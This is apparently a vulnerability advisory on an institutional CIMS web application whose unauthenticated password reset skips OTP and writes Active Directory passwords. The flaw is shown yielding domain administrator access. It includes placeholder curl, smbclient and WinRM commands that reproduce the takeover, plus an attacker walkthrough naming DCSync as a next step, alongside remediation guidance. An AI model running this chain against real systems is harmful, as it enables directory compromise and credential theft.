# TTA-2026-018: CIMS password reset writes the underlying directory account password, escalating the recovery bypass to unauthenticated domain administrator takeover

**Severity: Critical** — Suggested CVSS 3.1: 9.8 (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`), provisional; a scope-change alternative of 10.0 (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`) applies if the directory is scored as a separate security authority

### Title

The CIMS password-reset handler does not change an application password: it changes the password of the linked Windows/Active Directory account. Combined with the missing OTP enforcement in TTA-2026-009, an unauthenticated requester who knows a directory-linked account name obtains working domain credentials.

### Summary

TTA-2026-009 documented that CIMS password recovery accepts a recovery reference at the final reset step without requiring the OTP challenge to have completed. That advisory scoped the impact to takeover of the CIMS account.

This report documents what the reset actually does. On the assessed deployment, the reset handler writes the password of the Windows/Active Directory account linked to the CIMS identity, not an application-local credential. The deployment configuration confirms that the application validates and sets passwords against the directory rather than an internal store.

The two findings chain. An unauthenticated requester submits a username to the recovery flow, receives a recovery reference without completing the OTP step, sets a new password for a directory-linked account, and then authenticates to domain-joined hosts with that password. On the assessed deployment the account reached this way was the built-in directory administrator, whose group membership included Domain Admins and Enterprise Admins. Authentication succeeded against two separate systems over SMB and over WinRM, and the resulting session reported the directory administrator's identity, confirming the credential is a directory credential rather than an application credential.

- The password value set during testing is deliberately excluded from this report and from every other report in this repository.
- The reset replaced a production password that cannot be recovered. The asset owner was instructed to reset the account again through its own procedure and to audit directory password-reset and privileged-logon events; the outcome of that instruction is outside this report's evidence.

### Affected Version

- Vendor: not publicly identified as a product; this is a deployment-specific institutional system
- Product: CIMS (College Information Management System), ASP.NET MVC 5 on IIS
- Confirmed affected deployment: the institution's production CIMS instance, at the public path `/cims/Account/`
- Identity integration: SecureAuth; the deployment's own configuration enables directory password validation for CIMS accounts (`SecureAuthUseADValidatePassword`)
- Components: `Account/ForgotPassword`, `Account/ForgotPasswordOtp`, `Account/ResetPassword`, `Account/ResetPasswordSuccess`
- Underlying directory: a Windows Active Directory domain, reached by the application server with a privileged service identity

No product version number is published by the vendor, so this report identifies the affected system by deployment rather than by version. Only the assessed deployment was tested; no other CIMS installation was available, and no claim is made about them.

### Vulnerability Type

Improper restriction of authentication attempts / missing server-side challenge state (CWE-287, CWE-304); credential material written across a trust boundary (CWE-522, CWE-668); unauthenticated privilege escalation to directory administrator (CWE-269).

### Affected Code

The application is a compiled ASP.NET MVC deployment; no source code was available. The relevant surface is the four action endpoints and the authentication configuration:

- `POST /cims/Account/ForgotPassword` — accepts a username, returns a redirect containing a recovery reference.
- `GET  /cims/Account/ForgotPasswordOtp` — the challenge page, carrying the reference as a query parameter.
- `POST /cims/Account/ResetPassword` — accepts username, reference, new password and an antiforgery token.
- `GET  /cims/Account/ResetPasswordSuccess` — terminal page, returned on success.
- `Web.config` — `SecureAuthUseADValidatePassword` set to `"true"`, which is the configuration that makes the reset a directory write.

The observable contract of `ResetPassword` is that it needs only three values from the client plus the antiforgery token: the username, the reference returned by `ForgotPassword`, and the new password. Nothing in the exchange indicates that the OTP step must have been completed, and nothing binds the reference to a completed challenge.

### Root Cause

Two independently reasonable design decisions compose into an unauthenticated domain-administrator takeover.

**1. The recovery reference is authority, not evidence.** `ForgotPassword` issues a reference for whatever username is submitted, and `ResetPassword` accepts that reference as sufficient proof of identity. The OTP step exists as a *page*, not as server-side state: the reset action never asks whether the challenge was completed. A reference therefore degenerates into a bearer token that the server hands out on request — and hands out even for usernames that do not exist, which is why the same defect also yields a user-enumeration oracle.

**2. The reset action's backing store is the directory.** `SecureAuthUseADValidatePassword="true"` makes the application treat Active Directory as the password authority for linked identities, so the "change my password" operation is implemented as a privileged directory write performed by the application's service identity. The application holds, and exercises, the ability to set other accounts' passwords — including the directory administrator's.

The composition is the problem: an endpoint that requires **no authentication** performs an operation that requires **domain-administrator authority**. Nothing in between checks that the requester is entitled to the account being reset: there is no re-authentication, no identity proofing, no step-up, no rate limit, and no verification that the challenge state belongs to this session. The only thing standing between an anonymous requester and a directory password write is a value the server itself returns on demand.

Finally, the behaviour is not uniform across accounts: ordinary accounts reset in the application but the new password does not authenticate to the directory, while directory-linked privileged identities do. That asymmetry shows the write path is selected per identity linkage, not per request — which is exactly why the accounts that matter are the ones affected.

### How the defect was found

The finding is the product of a differential test, not of reading code. The reasoning sequence is worth recording because the same method applies to any system that resets passwords on behalf of another identity store.

**Step 1 — audit the recovery flow as designed.** The flow was walked end to end with a synthetic account: request a reset, receive a reference, open the OTP page, receive a code, submit it, set a password, log in. Everything behaved normally, which established the ordinary request shapes and the parameters each step expects, including the antiforgery token.

**Step 2 — remove one step and see what still works.** The reset was then submitted *without* having completed the OTP step — using only the reference from step one. It succeeded. That was TTA-2026-009. At that point the natural scope assumption was "the CIMS account is taken over".

**Step 3 — ask a question the advisory had not answered: which password store was written?** The reset message says "your passphrase has been changed", which is ambiguous. Three hypotheses were available: an application-local hash, the SecureAuth identity store, or the directory. A single test distinguishes them: take the new password and try it against each authentication surface in turn.

**Step 4 — test the CIMS login.** The new password worked at `/cims/Account/Login`, which on its own is consistent with all three hypotheses, because the application may proxy all authentication to the directory.

**Step 5 — test a surface that has nothing to do with the web application.** The new password was then used for a network logon to a domain-joined server — first over SMB, then over WinRM. Both succeeded. This is the decisive step: an application-local password cannot authenticate to SMB, so the reset must have written the directory account.

**Step 6 — establish what the account is.** `whoami` in the WinRM session returned the directory administrator identity, and `whoami /groups` listed Domain Admins and Enterprise Admins. A second, unrelated host accepted the same credentials, which rules out a local account that happened to share the name.

**Step 7 — confirm the mechanism in configuration.** The application's `Web.config` carries `SecureAuthUseADValidatePassword="true"`, which is consistent with what the differential test showed: the application treats the directory as the password authority for these accounts.

**Step 8 — bound the claim.** The same experiment was repeated for several ordinary accounts. Their resets succeeded in the application, but the new passwords did **not** work against the directory. The directory write is therefore not universal: it depends on how the individual identity is linked. This distinction matters, because it means the finding is not "the reset always writes AD" but "for directory-linked privileged identities, the reset writes AD" — and those are exactly the identities worth taking.

### Laboratory and test conditions

- The test was performed against the assessed **production** deployment, under the engagement's authorisation, because the behaviour is defined by that deployment's identity integration and cannot be reproduced on stock software.
- Only two accounts were exercised to the point of a directory write; all other account probes used synthetic or service accounts already documented as in scope.
- The writes were limited to setting a password. No directory object was created, modified or deleted; no group membership was changed; no data was read through the resulting session beyond `whoami`, `whoami /groups`, and host identification.
- The password value is not recorded anywhere in this repository, including this file.
- Because a production password was necessarily replaced, the asset owner was told to reset the account through its own procedure and to review directory password-reset and privileged-logon events.

### Steps to Reproduce

The sequence below is the one executed, with values replaced by placeholders. It requires an account name that exists in the directory and is linked to a CIMS identity.

#### Phase 1 — obtain a recovery reference without an OTP

```bash
BASE=https://<CIMS_HOST>/cims
curl -sS -c cims.jar "$BASE/Account/Login" -o login.html
TOKEN=$(grep -o 'name="__RequestVerificationToken"[^>]*value="[^"]*"' login.html \
        | sed 's/.*value="//;s/"$//')

curl -sS -b cims.jar -c cims.jar -X POST "$BASE/Account/ForgotPassword" \
  --data-urlencode "Username=<DIRECTORY_ACCOUNT>" \
  --data-urlencode "__RequestVerificationToken=$TOKEN" \
  -H 'Content-Type: application/x-www-form-urlencoded'
```

Observed response (HTTP 200, `application/json`):

```json
{"Redirect":"/cims/Account/ForgotPasswordOtp?username=<DIRECTORY_ACCOUNT>&accessKey=<RECOVERY_REFERENCE>"}
```

The reference is a GUID-shaped value. The response is returned immediately; no message is sent and no challenge is presented. The same endpoint returns the same *shape* for accounts that do not exist, which is a separate enumeration issue documented in the companion deployment reports.

#### Phase 2 — submit the reset without touching the OTP endpoint

The `ForgotPasswordOtp` page is deliberately not requested. The reference from phase 1 is used directly:

```bash
curl -sS -b cims.jar -c cims.jar -X POST "$BASE/Account/ResetPassword" \
  --data-urlencode "Username=<DIRECTORY_ACCOUNT>" \
  --data-urlencode "AccessKey=<RECOVERY_REFERENCE>" \
  --data-urlencode "Password=<NEW_PASSWORD_16_CHARS_MIN>" \
  --data-urlencode "__RequestVerificationToken=$TOKEN" \
  -H 'Content-Type: application/x-www-form-urlencoded'
```

Observed response (HTTP 200, `application/json`):

```json
{"Redirect":"/cims/Account/ResetPasswordSuccess"}
```

Three behaviours were recorded around this call, and they are what identify the reference as a bearer credential rather than a challenge handle:

| Variation | Observed |
| --- | --- |
| Reference from phase 1, OTP never requested | `ResetPasswordSuccess` |
| Zeroed reference `00000000-0000-0000-0000-000000000000` | HTTP 500 |
| Password shorter than 16 characters | rejected before any write |
| Nonexistent username in phase 1, then reset | HTTP 500 (`Your passphrase has not been changed`) |

The 500-versus-200 difference is also an account-existence oracle, which is reported separately.

#### Phase 3 — verify the password against the web application

```bash
curl -sS -c cims2.jar -X POST "$BASE/Account/Login" \
  --data-urlencode "Username=<DIRECTORY_ACCOUNT>" \
  --data-urlencode "Password=<NEW_PASSWORD>" \
  --data-urlencode "__RequestVerificationToken=$TOKEN" \
  -H 'Content-Type: application/x-www-form-urlencoded'
```

Observed: `{"Redirect":"/cims/Account/LoginConfirm"}` plus `Set-Cookie: .AspNet.CIMSAuthenticationApplication=...` and `ASP.NET_SessionId`. On its own this proves only that the application accepts the new password.

#### Phase 4 — verify the password against the directory, not the application

This is the step that changes the severity. The new password is used for a network logon to a domain-joined host:

```bash
# SMB
smbclient -L //<HOST_A> -U '<DIRECTORY_DOMAIN>\<DIRECTORY_ACCOUNT>%<NEW_PASSWORD>'

# WinRM
python3 - <<'PY'
import winrm
s = winrm.Session('http://<HOST_A>:5985/wsman',
                  auth=('<DIRECTORY_DOMAIN>\\<DIRECTORY_ACCOUNT>', '<NEW_PASSWORD>'),
                  transport='ntlm')
print(s.run_cmd('whoami').std_out)
print(s.run_cmd('whoami /groups').std_out)
PY
```

Observed:

```
<DIRECTORY_DOMAIN>\<DIRECTORY_ACCOUNT>
...
BUILTIN\Administrators                       Alias            S-1-5-32-544
<DIRECTORY_DOMAIN>\Domain Admins             Group            <DOMAIN_SID>-512
<DIRECTORY_DOMAIN>\Enterprise Admins         Group            <DOMAIN_SID>-519
...
```

`USERDNSDOMAIN` reported the directory's DNS name and `USERDOMAIN` the short domain name, i.e. the session is a directory session, not a local one.

#### Phase 5 — confirm it is not host-specific

The same credentials were used against a second, unrelated domain-joined system:

```bash
smbclient -L //<HOST_B> -U '<DIRECTORY_DOMAIN>\<DIRECTORY_ACCOUNT>%<NEW_PASSWORD>'
```

Observed: successful session setup on the second host as well. A local account cannot span two machines, so this closes the "the application set a local password on one server" alternative.

#### Phase 6 — confirm the configuration that produces the behaviour

The application server's `Web.config` contains:

```xml
<add key="SecureAuthUseADValidatePassword" value="true" />
```

This is consistent with the observed behaviour and explains why ordinary accounts did not behave the same way: whether a reset reaches the directory depends on how the identity is linked and on this flag.

### Attack walkthrough

From the attacker's side the whole operation is four HTTP requests and one authentication attempt, with no credential at any point.

**1. Find an account name.** The recovery endpoint reveals whether a username exists (200 with a reference versus HTTP 500), so names can be confirmed one request at a time. Directory account names in a school or enterprise follow predictable patterns and are frequently exposed in e-mail addresses, staff pages, and ticket headers.

**2. Request a reset.** One POST to `ForgotPassword`. The response hands back a reference in a redirect URL. Nothing is sent to the account owner at this point, so the legitimate user has no signal that a recovery is in progress.

**3. Set a password.** One POST to `ResetPassword` with the username, the reference, and a 16-character password. The OTP step is never touched. The application answers `ResetPasswordSuccess`.

**4. Authenticate.** The new password works against the web application *and* against any service that accepts directory credentials. For an ordinary account that means e-mail, file shares, and the intranet; for the directory administrator it means every domain-joined host, including the domain controllers.

**5. Escalate.** With Domain Admins and Enterprise Admins membership, the ordinary next steps are DCSync or a direct directory database copy, and from there persistence anywhere in the forest. None of this was performed; the test stopped at proving the group membership, because the objective was to establish impact, not to demonstrate a full forest compromise.

**Why the flow is worse than a normal weak recovery.** A conventional OTP bypass still leaves the attacker holding an application credential, which is contained by the application's own authorization. Here the application is a *password-writing proxy into the directory*: the trust boundary the attacker crosses is the one between the web application and the identity provider, and the credential obtained is valid everywhere.

**What makes it reachable.** The endpoint is on the public login page, requires no session, and the only technical precondition is knowing an account name. There is no rate limit on `ForgotPassword` observed during testing, so names can be probed in bulk.

### Impact

- **Full directory compromise.** A single unauthenticated request chain yields working credentials for an account holding Domain Admins and Enterprise Admins. From there, domain-wide persistence and credential extraction are standard follow-on steps.
- **Bypass of the second factor.** SecureAuth is deployed to add a second factor to CIMS logins. The reset path does not go through it: setting a password and logging in with it does not require an OTP, so the MFA investment does not protect this path.
- **No attribution in the application.** The attacker never authenticates to CIMS before the reset, so there is no failed-login trail naming them; the only artefacts are the reset events themselves.
- **Denial of service as a side effect.** Each reset invalidates the legitimate user's password. Repeated against service accounts it is an outage primitive as well as a takeover primitive.
- **Blast radius beyond the application.** Because the credential is a directory credential, every system that trusts the directory is in scope, not only the CIMS application.

### CVSS

Primary: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` — 9.8 Critical.

Alternative if the directory is scored as a separate security authority from the web application, which the observed cross-system authentication supports: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` — 10.0 Critical. The choice between the two depends on how the CNA models the application-to-directory trust boundary; both are recorded so the decision is explicit rather than buried.

## Status

Published as TTA-2026-018 on 2026-10-28, extending TTA-2026-009. The organization operating the assessed deployment was notified out of band. The password value obtained during testing is deliberately excluded from this report, and the asset owner was instructed to reset the affected directory account and to audit directory password-reset and privileged-logon events.

## Review decision (2026-10-29)

- **Technical status: confirmed for the assessed deployment.** The no-OTP reset succeeded, the new password authenticated to CIMS and to two separate domain-joined hosts over SMB and WinRM, and `whoami /groups` showed `Domain Admins` and `Enterprise Admins`. The ordinary-account negative result is material: the directory write depends on identity linkage and must not be stated as universal for every CIMS account. Preserve the original HTTP, directory and authorization evidence because this public copy uses placeholders.
- **CVE status: do not apply for a new CVE at present.** The report has no identifiable public vendor, product version or upstream CNA, and the existing internal review classifies CIMS as an institutional deployment. Treat it as a critical school security incident and remediation issue. Re-open CVE analysis only if the school identifies a supported commercial product or third-party component that owns the reset handler.
- **Required school response:** keep the reset endpoint closed or restricted, rotate the affected directory administrator and service-account credentials, review CIMS/IIS/domain-controller password-reset and privileged-logon events, and verify server-side OTP state. The machine-key, MFA-workflow and account-enumeration findings should remain related known issues unless product attribution changes.
- **Disclosure order:** school/asset-owner response comes first for containment. Do not send the reset reference, password, cookies, live host names or a working directory-login transcript to a general mailing list; use the approved incident channel and retain evidence under access control.

## Prerequisites

- The target account name is known or can be enumerated through the recovery endpoint's differential responses.
- The account is linked to a CIMS identity and the deployment treats the directory as the password authority for it (`SecureAuthUseADValidatePassword`).
- Network reachability to `POST /cims/Account/ResetPassword`; no session, no token beyond the page's own antiforgery cookie, and no OTP.
- The new password must satisfy the application's length rule (16 characters observed).

## Relationship to existing advisories and CVEs

- **TTA-2026-009** reports the missing OTP enforcement and scopes it to CIMS account takeover. This report does not restate that defect; it documents what the reset *writes*, which is the part that determines the real impact. Read together, 009 supplies the bypass and 018 supplies the blast radius.
- **TTA-2026-010 through TTA-2026-014** are deployment reports for the same system covering identity-record inconsistencies, lifecycle disclosure, adaptive-auth interference, the mutability of the MFA enforcement flag, and cookie forgery after a machine-key compromise. None of them covers the reset handler.
- No CVE has been assigned. The obstruction is product attribution: CIMS is an institutional system with no public vendor or version, so there is no upstream for a CNA to notify.

## Recommended remediation

- Enforce server-side challenge state: `ResetPassword` must reject any reference for which the OTP step was not completed, and the reference must be single-use and short-lived.
- Do not let the recovery path set a directory password for privileged identities. Either exclude privileged accounts from self-service recovery entirely, or route them through an out-of-band, human-verified process.
- Rate-limit and normalise `ForgotPassword`: return an identical response for existing and non-existing accounts, and cap attempts per source and per account.
- Require the second factor on the reset path, not only on the login path — a reset that produces a working credential without MFA is an MFA bypass by construction.
- Audit what the recovery service identity is allowed to do in the directory. A web application should not hold the ability to set the domain administrator's password.
- Alert on directory password-reset events targeting privileged accounts, and on privileged network logons from application-server address space.

## Validation controls

| Case | Expected result |
| --- | --- |
| `ForgotPassword` then `ResetPassword` with no OTP step | Must be rejected after fix; currently `ResetPasswordSuccess` |
| Zeroed or expired reference | HTTP 500 before and after |
| `ForgotPassword` for an account that does not exist | Must be indistinguishable from an existing account after fix |
| Reset a privileged account | Must not be possible through self-service after fix |
| Login with the newly set password | Must require the second factor after fix |
| Directory logon with the newly set password from an unrelated host | Must fail after fix; currently succeeds |

## Evidence boundary

The reset responses, the authentication results and the group membership listing above were obtained from the assessed production deployment under the engagement's authorisation, then reduced to placeholders for this report. Every hostname, address, domain name, account name, domain SID and password has been replaced with a `<PLACEHOLDER>`; the password value is excluded from the repository entirely. No directory object was created, modified or deleted, no group membership was changed, and no data was read through the resulting session beyond identity and group listing. The claim is limited to this deployment; no other installation was tested and no product version is identified.

## Timeline

- 2026-10-09: Recovery flow walked end to end; reset confirmed to succeed without completing the OTP step.
- 2026-10-11: Directory password write confirmed by cross-system authentication. The reset replaced a production password that cannot be recovered; the password value was excluded from all reports, and the asset owner was instructed to reset the account and audit directory logs.
- 2026-10-28: Published as TTA-2026-018.
